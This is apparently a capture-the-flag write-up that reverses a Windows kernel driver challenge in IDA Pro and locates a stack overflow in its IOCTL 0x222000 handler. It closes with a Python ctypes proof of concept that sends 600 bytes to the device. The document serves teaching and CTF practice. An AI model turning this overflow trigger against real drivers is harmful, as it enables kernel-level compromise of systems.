@@ -1,0 +1,110 @@
+This challenge required you to run it on Windows 10 and its a kernel based challenge. The challenge quite straight forward overflow. 
+
+Open it up in IDA Pro, we can see it stops at entrypoint DriverEntry
+INIT:0000000140006000                 mov     [rsp+arg_0], rbx
+INIT:0000000140006005                 push    rdi
+INIT:0000000140006006                 sub     rsp, 20h
+INIT:000000014000600A                 mov     rbx, rdx
+INIT:000000014000600D                 mov     rdi, rcx
+INIT:0000000140006010                 call    sub_14000602C     ; call to security check cookie
+INIT:0000000140006015                 mov     rdx, rbx
+INIT:0000000140006018                 mov     rcx, rdi        ; DriverObject
+INIT:000000014000601B                 mov     rbx, [rsp+28h+arg_0]
+INIT:0000000140006020                 add     rsp, 20h
+INIT:0000000140006024                 pop     rdi
+INIT:0000000140006025                 jmp     sub_140001000     ; jump to our original code
+
+When you land at DriverEntry, please note that the "CALL" is always calling the security check cookie. Thus that is not the function you want to analyze. 
+
+Then at the address "0000000140001014" we can see "\\Device\\wgmy" which is a reference to future create device. 
+.text:0000000140001014                 lea     rdx, SourceString ; "\\Device\\wgmy"
+.text:000000014000101B                 xor     edi, edi
+.text:000000014000101D                 mov     qword ptr [rbp+DestinationString.MaximumLength], rax
+.text:0000000140001021                 mov     dword ptr [rbp+DestinationString.Buffer+2], eax
+.text:0000000140001024                 mov     rbx, rcx
+.text:0000000140001027                 mov     word ptr [rbp+DestinationString.Buffer+6], ax
+.text:000000014000102B                 mov     qword ptr [rbp+SymbolicLinkName.MaximumLength], rax
+.text:000000014000102F                 mov     dword ptr [rbp+SymbolicLinkName.Buffer+2], eax
+.text:0000000140001032                 mov     word ptr [rbp+SymbolicLinkName.Buffer+6], ax
+.text:0000000140001036                 lea     rax, nullsub_1
+.text:000000014000103D                 mov     [rcx+68h], rax
+.text:0000000140001041                 lea     rcx, [rbp+DestinationString] ; DestinationString
+.text:0000000140001045                 mov     [rbp+DestinationString.Length], di
+.text:0000000140001049                 mov     [rbp+SymbolicLinkName.Length], di
+.text:000000014000104D                 mov     [rbp+arg_0], rdi
+.text:0000000140001051                 call    cs:RtlInitUnicodeString
+.text:0000000140001057                 lea     rdx, aDosdevicesWgmy ; "\\DosDevices\\wgmy"
+.text:000000014000105E                 lea     rcx, [rbp+SymbolicLinkName] ; DestinationString
+.text:0000000140001062                 call    cs:RtlInitUnicodeString
+
+The address "000000014000107C" is where the device will be created. So it need to get initialize the device name first then can create device. 
+.text:000000014000107C                 lea     r8, [rbp+DestinationString] ; DeviceName
+.text:0000000140001080                 mov     rcx, rbx        ; DriverObject
+.text:0000000140001083                 mov     [rsp+60h+DeviceCharacteristics], 100h ; DeviceCharacteristics
+.text:000000014000108B                 call    cs:IoCreateDevice
+
+Then we'll have to look into this interesting code where it has two different "sub" function here. One of these function should help us to land to the part that we wanted to analyze. The function "sub_140001118" is landed to clearing the registers and exit. 
+
+.text:000000014000109F                 lea     rax, sub_140001118   ; nothing happened here, its just exit
+.text:00000001400010A6                 mov     ecx, 1Bh
+.text:00000001400010AB                 lea     rdi, [rbx+70h]
+.text:00000001400010AF                 rep stosq
+.text:00000001400010B2                 lea     rax, sub_1400010D8   ; an interesting path
+
+If we look into Windows Driver model, we can reconstruct the code as in following driver structure:
+
+DriverEntry NTSTATUS
+	DriverEntry (
+	PDRIVER_OBJECT DriverObject,
+	PUNICODE_STRING RegistryPath
+);
+
+DRIVER_OBJECT
+typedef struct _DRIVER_OBJECT {
+     SHORT Type;
+     SHORT Size;
+     PDEVICE_OBJECT DeviceObject;
+     ULONG Flags;
+     PVOID DriverStart;
+     ULONG DriverSize;
+     PVOID DriverSection;
+     PDRIVER_EXTENSION DriverExtension;
+     UNICODE_STRING DriverName;
+     PUNICODE_STRING HardwareDatabase;
+     PFAST_IO_DISPATCH FastIoDispatch;
+     LONG * DriverInit;
+     PVOID DriverStartIo;
+     PVOID DriverUnload;
+     LONG * MajorFunction[28];      // IRP_MJ_DEVICE_CONTROL
+} DRIVER_OBJECT, *PDRIVER_OBJECT;
+
+//.text:00000001400010B2                 lea     rax, sub_1400010D8   ;
+DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlhandler;
+
+Then if we follow the function "sub_1400010D8", we can see the IOCTL here and the rest of the code. Here's where the vulnerability located. 
+
+.text:00000001400010D8                 push    rbx
+.text:00000001400010DA                 sub     rsp, 220h                        ; our buffer size
+.text:00000001400010E1                 mov     rax, [rdx+0B8h]
+.text:00000001400010E8                 mov     rbx, rdx
+.text:00000001400010EB                 cmp     dword ptr [rax+18h], 222000h     ; IOCTL value
+.text:00000001400010F2                 jnz     short loc_140001100
+.text:00000001400010F4                 mov     ecx, [rdx+18h]                   ; store in ecx
+.text:00000001400010F7 loc_1400010F7:            
+.text:00000001400010F7                 mov     al, [rcx]                        ; incremental in 
+.text:00000001400010F9                 inc     rcx                              ; RCX register 
+.text:00000001400010FC                 test    al, al                           ; trigger overflow (strcpy function lol)
+.text:00000001400010FE                 jnz     short loc_1400010F7
+
+To exploit the issue, we can construct POC as in following:
+
+import ctypes, sys
+from ctypes import *
+
+kernel32 = windll.kernel32
+hDevice = kernel32.CreateFileA("\\\\.\\wgmy", 0xC0000000, 0, None, 0x3, 0, None)
+buffer = "A" * 600
+buffer_length = len(buffer)
+kernel32.DeviceIoControl(hDevice, 0x222000, buffer, buffer_length, None, 0, byref(c_ulong()), None)
+
+I let the rest of the full exploitation to you guys :) enjoice
